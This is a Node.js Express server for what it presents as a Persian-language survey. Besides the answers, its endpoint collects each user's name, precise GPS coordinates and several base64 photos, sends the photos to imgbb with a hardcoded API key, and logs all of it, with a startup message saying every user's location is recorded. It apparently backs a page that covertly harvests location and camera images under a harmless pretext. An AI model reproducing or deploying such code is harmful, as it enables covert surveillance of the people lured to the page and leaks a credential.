import express from "express";
import axios from "axios";
import path from "path";
import { fileURLToPath } from "url";

const app = express();
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

app.use(express.static(__dirname));
app.use(express.json({ limit: "50mb" }));

const IMGBB_API_KEY = "2fe3007ea3853c345b114b7394111687";

const questions = [
  { key: 'age', text: 'چند سال دارید؟', options: ['بین ۲۰ تا ۳۰', 'بین ۳۰ تا ۴۰', 'بین ۴۰ تا ۵۰'] },
  { key: 'children', text: 'چند تا بچه دارید؟', options: ['۱', '۲ تا ۳', '۴ تا بیشتر'] },
  { key: 'animal', text: 'کدام حیوان را دوست دارید؟', options: ['سگ', 'گربه', 'لاک‌پشت'] },
  { key: 'city', text: 'کدام شهر را ترجیح می‌دهید؟', options: ['کیش', 'شمال', 'تبریز'] },
  { key: 'money', text: 'در حال حاضر چقدر پول دارید؟', options: ['۱۰', '۱۰۰', '۱۰۰۰'] },
];

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.post("/send-sms", async (req, res) => {
  try {
    const { name, answers, photos, location } = req.body;

    // 🎯 نمایش اطلاعات در لاگ
    console.log("=".repeat(70));
    console.log("🎯🎯🎯 جدیدترین نظرسنجی ثبت شد 🎯🎯🎯");
    console.log("👤 نام کاربر:", name || "نامشخص");
    console.log("📍 موقعیت:", location?.address || "موقعیت نامشخص");
    
    if (location?.latitude) {
      console.log("📌 مختصات دقیق:");
      console.log("   عرض جغرافیایی:", location.latitude);
      console.log("   طول جغرافیایی:", location.longitude);
      console.log("   دقت موقعیت‌یابی:", location.accuracy + " متر");
    }

    console.log("📊 پاسخ‌های کاربر:");
    if (answers && Object.keys(answers).length > 0) {
      Object.keys(answers).forEach(key => {
        const question = questions.find(q => q.key === key);
        console.log("   ✅ " + (question?.text || key) + ":", answers[key]);
      });
    } else {
      console.log("   ❌ هیچ پاسخی ثبت نشده");
    }

    console.log("🖼️ تعداد عکس‌ها:", photos?.length || 0);
    console.log("⏰ زمان ثبت:", new Date().toLocaleString('fa-IR'));
    console.log("-".repeat(50));

    // آپلود عکس‌ها
    if (photos && photos.length > 0) {
      for (let i = 0; i < photos.length; i++) {
        try {
          const base64 = photos[i];
          const imageData = base64.split(",")[1];
          const formData = new URLSearchParams();
          formData.append("key", IMGBB_API_KEY);
          formData.append("image", imageData);

          const result = await axios.post("https://api.imgbb.com/1/upload", formData);
          
          const questionKey = Object.keys(answers)[i];
          const questionObj = questions.find(q => q.key === questionKey);
          
          console.log("📸 عکس " + (i + 1) + " آپلود شد:");
          console.log("   سوال:", questionObj?.text || `سوال ${i + 1}`);
          console.log("   پاسخ:", answers[questionKey] || 'نامشخص');
          console.log("   موقعیت:", location?.address || 'نامشخص');
          if (location?.latitude) {
            console.log("   مختصات:", "عرض " + location.latitude + ", طول " + location.longitude);
          }
          console.log("   لینک عکس:", result.data.data.url);
          console.log("   " + "─".repeat(40));
          
        } catch (error) {
          console.log("❌ خطا در آپلود عکس " + (i + 1) + ":", error.message);
        }
      }
    }

    // خلاصه نهایی
    console.log("✅ خلاصه نهایی نظرسنجی:");
    console.log("👤 کاربر:", name || "نامشخص");
    console.log("📍 موقعیت:", location?.address || "نامشخص");
    console.log("📝 تعداد پاسخ‌ها:", Object.keys(answers || {}).length);
    console.log("🖼️ تعداد عکس‌ها:", photos?.length || 0);
    console.log("🕒 زمان نهایی:", new Date().toLocaleString('fa-IR'));
    console.log("🎯🎯🎯 پایان نظرسنجی 🎯🎯🎯");
    console.log("=".repeat(70));
    console.log(""); // خط خالی برای جداسازی

    return res.json({ 
      ok: true, 
      message: "نظرسنجی با موفقیت ثبت شد. از مشارکت شما متشکریم! ✅"
    });

  } catch (err) {
    console.error("❌ خطای سرور در ثبت نظرسنجی:", err.message);
    return res.status(500).json({ 
      ok: false, 
      error: "خطا در ثبت اطلاعات" 
    });
  }
});

// Route برای تست لاگ
app.get("/test", (req, res) => {
  console.log("🔍 تست لاگ - این پیام باید در لاگ‌های Render دیده شود");
  console.log("📅 زمان سرور:", new Date().toLocaleString('fa-IR'));
  console.log("🌍 موقعیت تست: تهران، ایران");
  console.log("📌 مختصات تست: عرض 35.6892, طول 51.3890");
  console.log("👤 کاربر تست: تست کننده");
  console.log("✅ تست لاگ موفقیت‌آمیز بود");
  
  res.json({ 
    message: "تست لاگ انجام شد - به بخش Logs در Render مراجعه کنید",
    timestamp: new Date().toLocaleString('fa-IR'),
    status: "success"
  });
});

// Route سلامت
app.get("/health", (req, res) => {
  res.json({ 
    status: "OK", 
    message: "سرور در حال اجراست",
    timestamp: new Date().toLocaleString('fa-IR')
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("🚀 سرور اجرا شد روی پورت: " + PORT);
  console.log("🔗 آدرس سایت: https://manual.uff7.onrender.com");
  console.log("🔗 تست لاگ: https://manual.uff7.onrender.com/test");
  console.log("🔗 سلامت: https://manual.uff7.onrender.com/health");
  console.log("📝 تمام موقعیت‌ها و پاسخ‌های کاربران در لاگ نمایش داده می‌شوند");
  console.log("⭐ برای تست، به آدرس /test بروید و سپس لاگ‌ها را چک کنید");
});